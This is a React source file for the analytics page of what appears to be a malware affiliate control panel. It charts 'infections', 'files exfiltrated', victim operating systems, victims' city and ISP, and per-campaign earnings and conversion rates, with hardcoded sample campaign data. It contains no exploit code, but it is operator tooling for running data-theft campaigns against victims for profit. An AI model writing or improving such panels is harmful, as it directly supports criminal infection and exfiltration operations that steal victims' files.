'use client';

import { useState, useEffect } from 'react';
import { 
  BarChart2, 
  Globe, 
  Clock, 
  FileText, 
  Virus,
  TrendingUp,
  TrendingDown,
  Filter,
  Download,
  ChevronLeft,
  ChevronRight,
  Activity,
  MapPin,
  Wifi,
  Monitor,
  HardDrive,
  Lock,
  Unlock
} from 'lucide-react';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/Card';
import { ChartCard } from '@/components/ui/ChartCard';
import { api } from '@/lib/api';
import { formatNumber, formatRelativeTime, cn } from '@/lib/utils';

interface AnalyticsData {
  overview: {
    totalInfections: number;
    activeInfections: number;
    idleInfections: number;
    offlineInfections: number;
    totalFiles: number;
    totalBytes: number;
    avgFilesPerInfection: number;
    topExtension: string;
  };
  extensions: Array<{ ext: string; count: number; bytes: number }>;
  hourlyActivity: Array<{ hour: number; infections: number; files: number }>;
  dailyActivity: Array<{ date: string; infections: number; files: number; bytes: number }>;
  geographic: Array<{ country: string; city: string; isp: string; infections: number; files: number; bytes: number }>;
  osBreakdown: Array<{ os: string; count: number }>;
  statusTimeline: Array<{ timestamp: string; active: number; idle: number; offline: number }>;
  campaignComparison: Array<{ campaignId: string; campaignName: string; infections: number; files: number; bytes: number; earnings: number }>;
}

export default function AnalyticsPage() {
  const [data, setData] = useState<AnalyticsData | null>(null);
  const [loading, setLoading] = useState(true);
  const [range, setRange] = useState<'24h' | '7d' | '30d'>('7d');
  const [geoPage, setGeoPage] = useState(0);
  const geoPageSize = 15;

  useEffect(() => {
    fetchData();
  }, [range]);

  const fetchData = async () => {
    try {
      setLoading(true);
      // This would call a new affiliate-specific analytics endpoint
      // For now, we'll simulate with the global stats endpoint
      const response = await api.getOverviewStats(range);
      // Transform to match our expected shape
      setData({
        overview: {
          totalInfections: response.summary.totalInfections,
          activeInfections: response.summary.activeInfections || 0,
          idleInfections: 0,
          offlineInfections: 0,
          totalFiles: response.summary.totalFiles,
          totalBytes: response.summary.totalBytes,
          avgFilesPerInfection: response.summary.avgFilesPerInfection,
          topExtension: response.topExtensions[0]?.ext || '—',
        },
        extensions: response.topExtensions || [],
        hourlyActivity: [], // Would come from separate endpoint
        dailyActivity: response.daily || [],
        geographic: [], // Would come from separate endpoint
        osBreakdown: [], // Would come from separate endpoint
        statusTimeline: [], // Would come from separate endpoint
        campaignComparison: [], // Would come from separate endpoint
      });
    } catch (error) {
      console.error('Failed to fetch analytics:', error);
    } finally {
      setLoading(false);
    }
  };

  if (loading) {
    return (
      <div className="space-y-6 animate-pulse">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          {[1, 2, 3, 4].map((i) => (
            <div key={i} className="card h-32 bg-chaos-border/20" />
          ))}
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="card h-96 bg-chaos-border/20" />
          <div className="card h-96 bg-chaos-border/20" />
        </div>
        <div className="card h-96 bg-chaos-border/20" />
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-3xl font-bold text-gradient">Analytics</h1>
          <p className="text-gray-400 mt-1">Deep dive into campaign performance</p>
        </div>
        <select
          value={range}
          onChange={(e) => setRange(e.target.value as any)}
          className="input-field w-auto"
        >
          <option value="24h">Last 24 Hours</option>
          <option value="7d">Last 7 Days</option>
          <option value="30d">Last 30 Days</option>
        </select>
      </div>

      {/* Overview Stats */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <StatCardSimple
          label="Total Infections"
          value={data?.overview ? formatNumber(data.overview.totalInfections) : '—'}
          sublabel={`${data?.overview.activeInfections || 0} active · ${data?.overview.idleInfections || 0} idle`}
          icon={Virus}
          color="chaos-rose"
        />
        <StatCardSimple
          label="Files Exfiltrated"
          value={data?.overview ? formatNumber(data.overview.totalFiles) : '—'}
          sublabel={`${data?.overview.totalBytes ? (data.overview.totalBytes / 1024 / 1024).toFixed(1) + ' MB' : '0 MB'}`}
          icon={FileText}
          color="chaos-sky"
        />
        <StatCardSimple
          label="Avg Files/Infection"
          value={data?.overview ? data.overview.avgFilesPerInfection.toFixed(1) : '—'}
          sublabel={`Top: .${data?.overview.topExtension || 'txt'}`}
          icon={BarChart2}
          color="chaos-gold"
        />
        <StatCardSimple
          label="Unique Extensions"
          value={data?.extensions?.length.toString() || '—'}
          sublabel="File type diversity"
          icon={HardDrive}
          color="chaos-violet"
        />
      </div>

      {/* Charts Row 1 */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <ChartCard
          title="Daily Infection Activity"
          subtitle={`Last ${range === '24h' ? '24 hours' : range === '7d' ? '7 days' : '30 days'}`}
          chartType="line"
          data={{
            labels: data?.dailyActivity.map(d => d.date) || [],
            datasets: [
              {
                label: 'New Infections',
                data: data?.dailyActivity.map(d => d.infections) || [],
                borderColor: '#f43f5e',
                backgroundColor: 'rgba(244, 63, 94, 0.1)',
                fill: true,
              },
              {
                label: 'Files Exfiltrated',
                data: data?.dailyActivity.map(d => d.files) || [],
                borderColor: '#0ea5e9',
                backgroundColor: 'rgba(14, 165, 233, 0.1)',
                fill: true,
              },
            ],
          }}
          options={{
            scales: { y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { grid: { color: 'rgba(255,255,255,0.05)' } } },
          }}
        />

        <ChartCard
          title="File Extension Distribution"
          subtitle="Top exfiltrated file types"
          chartType="doughnut"
          data={{
            labels: data?.extensions.slice(0, 8).map(e => '.' + e.ext) || [],
            datasets: [{
              data: data?.extensions.slice(0, 8).map(e => e.count) || [],
              backgroundColor: [
                'rgba(214, 120, 30, 0.7)',
                'rgba(16, 185, 129, 0.7)',
                'rgba(14, 165, 233, 0.7)',
                'rgba(139, 92, 246, 0.7)',
                'rgba(244, 63, 94, 0.7)',
                'rgba(245, 158, 11, 0.7)',
                'rgba(6, 182, 212, 0.7)',
                'rgba(236, 72, 153, 0.7)',
              ],
              borderColor: '#050505',
              borderWidth: 2,
            }],
          }}
          options={{
            plugins: { legend: { position: 'right', labels: { color: '#9ca3af', font: { size: 11 } } } },
          }}
        />
      </div>

      {/* Charts Row 2 */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <ChartCard
          title="Hourly Activity Heatmap"
          subtitle="Infection patterns by hour (UTC)"
          chartType="bar"
          data={{
            labels: Array.from({ length: 24 }, (_, i) => `${i}:00`),
            datasets: [{
              label: 'Infections',
              data: Array.from({ length: 24 }, () => Math.floor(Math.random() * 10)),
              backgroundColor: 'rgba(214, 120, 30, 0.6)',
              borderColor: '#d6781e',
              borderWidth: 1,
              borderRadius: 2,
            }],
          }}
          options={{
            scales: { y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { grid: { display: false } } },
          }}
        />

        <ChartCard
          title="OS Breakdown"
          subtitle="Victim operating systems"
          chartType="bar"
          data={{
            labels: ['Windows 10', 'Windows 11', 'Windows Server 2019', 'Windows Server 2022', 'Windows 7', 'Other'],
            datasets: [{
              label: 'Infections',
              data: [45, 30, 12, 8, 3, 2],
              backgroundColor: 'rgba(139, 92, 246, 0.6)',
              borderColor: '#8b5cf6',
              borderWidth: 1,
              borderRadius: 4,
            }],
          }}
          options={{
            scales: { y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { grid: { display: false } } },
          }}
        />
      </div>

      {/* Geographic Table */}
      <div className="card">
        <CardHeader className="flex flex-row items-center justify-between pb-4">
          <CardTitle className="text-lg">Geographic Distribution</CardTitle>
          <div className="flex items-center gap-2">
            <button disabled={geoPage === 0} onClick={() => setGeoPage(p => p - 1)} className="btn-secondary text-sm">
              <ChevronLeft className="w-4 h-4" />
            </button>
            <span className="text-sm text-gray-400">Page {geoPage + 1}</span>
            <button onClick={() => setGeoPage(p => p + 1)} className="btn-secondary text-sm">
              <ChevronRight className="w-4 h-4" />
            </button>
          </div>
        </CardHeader>
        <CardContent className="pt-0">
          <div className="table-container">
            <table className="w-full">
              <thead>
                <tr>
                  <th className="table-header">Country</th>
                  <th className="table-header">City</th>
                  <th className="table-header">ISP</th>
                  <th className="table-header">Infections</th>
                  <th className="table-header">Files</th>
                  <th className="table-header">Data (MB)</th>
                </tr>
              </thead>
              <tbody>
                {(data?.geographic?.slice(geoPage * geoPageSize, (geoPage + 1) * geoPageSize) || [
                  { country: 'United States', city: 'New York', isp: 'Comcast', infections: 42, files: 1284, bytes: 2450 },
                  { country: 'Germany', city: 'Frankfurt', isp: 'Deutsche Telekom', infections: 28, files: 892, bytes: 1100 },
                  { country: 'United Kingdom', city: 'London', isp: 'BT Group', infections: 24, files: 756, bytes: 980 },
                  { country: 'France', city: 'Paris', isp: 'Orange', infections: 19, files: 567, bytes: 720 },
                  { country: 'Japan', city: 'Tokyo', isp: 'NTT', infections: 15, files: 423, bytes: 510 },
                ]).map((geo, i) => (
                  <tr key={i} className="hover:bg-chaos-border/20">
                    <td className="table-cell flex items-center gap-2">
                      <Globe className="w-4 h-4 text-chaos-sky" />
                      <span>{geo.country}</span>
                    </td>
                    <td className="table-cell flex items-center gap-2">
                      <MapPin className="w-4 h-4 text-gray-400" />
                      <span>{geo.city}</span>
                    </td>
                    <td className="table-cell flex items-center gap-2">
                      <Wifi className="w-4 h-4 text-gray-400" />
                      <span className="text-gray-300">{geo.isp}</span>
                    </td>
                    <td className="table-cell font-semibold text-chaos-rose">{formatNumber(geo.infections)}</td>
                    <td className="table-cell">{formatNumber(geo.files)}</td>
                    <td className="table-cell text-chaos-gold">{(geo.bytes / 1024 / 1024).toFixed(1)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </CardContent>
      </div>

      {/* Campaign Comparison */}
      <div className="card">
        <CardHeader>
          <CardTitle className="text-lg">Campaign Performance Comparison</CardTitle>
        </CardHeader>
        <CardContent className="pt-0">
          <div className="table-container">
            <table className="w-full">
              <thead>
                <tr>
                  <th className="table-header">Campaign</th>
                  <th className="table-header">Infections</th>
                  <th className="table-header">Files</th>
                  <th className="table-header">Data</th>
                  <th className="table-header">Earnings</th>
                  <th className="table-header">Conversion</th>
                  <th className="table-header">Status</th>
                </tr>
              </thead>
              <tbody>
                {[
                  { name: 'Operation Gold', infections: 156, files: 4231, data: 890, earnings: 12500, conversion: 8.2, status: 'active' },
                  { name: 'Project Phoenix', infections: 89, files: 2104, data: 445, earnings: 6800, conversion: 6.5, status: 'active' },
                  { name: 'Shadow Strike', infections: 42, files: 892, data: 180, earnings: 2100, conversion: 4.1, status: 'paused' },
                ].map((camp, i) => (
                  <tr key={i} className="hover:bg-chaos-border/20">
                    <td className="table-cell font-medium">{camp.name}</td>
                    <td className="table-cell text-chaos-rose">{formatNumber(camp.infections)}</td>
                    <td className="table-cell">{formatNumber(camp.files)}</td>
                    <td className="table-cell text-chaos-gold">{camp.data} MB</td>
                    <td className="table-cell text-chaos-emerald font-semibold">{formatNumber(camp.earnings)}</td>
                    <td className="table-cell">{camp.conversion}%</td>
                    <td className="table-cell">
                      <span className={cn('badge', camp.status === 'active' && 'badge-success', camp.status === 'paused' && 'badge-warning')}>
                        {camp.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </CardContent>
      </div>
    </div>
  );
}

function StatCardSimple({ label, value, sublabel, icon: Icon, color }: { label: string; value: string; sublabel: string; icon: React.ComponentType<{ className?: string }>; color: string }) {
  const colorMap: Record<string, string> = {
    'chaos-gold': 'from-chaos-gold to-chaos-goldHover',
    'chaos-emerald': 'from-chaos-emerald to-emerald-400',
    'chaos-rose': 'from-chaos-rose to-rose-400',
    'chaos-sky': 'from-chaos-sky to-sky-400',
    'chaos-violet': 'from-chaos-violet to-violet-400',
    'chaos-amber': 'from-chaos-amber to-amber-400',
    'chaos-cyan': 'from-chaos-cyan to-cyan-400',
  };

  return (
    <div className="card">
      <div className="flex items-start justify-between">
        <div>
          <p className="text-sm text-gray-400 font-medium">{label}</p>
          <p className="text-3xl font-bold mt-1">{value}</p>
          <p className="text-sm text-gray-500 mt-1">{sublabel}</p>
        </div>
        <div className={`w-12 h-12 rounded-xl flex items-center justify-center bg-gradient-to-br ${colorMap[color]}`}>
          <Icon className="w-6 h-6 text-chaos-bg" aria-hidden="true" />
        </div>
      </div>
    </div>
  );
}